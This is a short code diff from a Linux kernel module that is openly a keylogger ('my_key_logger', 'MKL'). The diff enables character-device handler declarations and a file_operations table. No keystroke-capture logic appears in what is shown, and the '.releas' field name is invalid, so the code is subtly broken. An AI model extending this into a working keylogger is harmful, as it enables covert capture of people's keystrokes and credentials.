@@ -22,17 +22,17 @@ static struct device* mkl_dev = NULL;
 static char *module_name = DEVICE_NAME;
 module_param(module_name, charp, S_IRUGO);
 
-/* static int dev_open(struct inode *, struct file *); */
-/* static int dev_release(struct inode *, struct file *); */
-/* static ssize_t dev_read(struct file *, char *, size_t, loff_t *); */
-/* static ssize_t dev_write(struct file *, const char *, size_t, loff_t *); */
+static int dev_open(struct inode *, struct file *);
+static int dev_release(struct inode *, struct file *);
+static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
+static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);
 
-/* static struct file_operations fops = { */
-/*   .open = dev_open, */
-/*   .read = dev_read, */
-/*   .write = dev_write, */
-/*   .releas = dev_release, */
-/* }; */
+static struct file_operations fops = {
+  .open = dev_open,
+  .read = dev_read,
+  .write = dev_write,
+  .releas = dev_release,
+};
 
 static int __init my_key_logger_init(void){
   printk(KERN_INFO "MKL: %s is Loaded!", module_name);
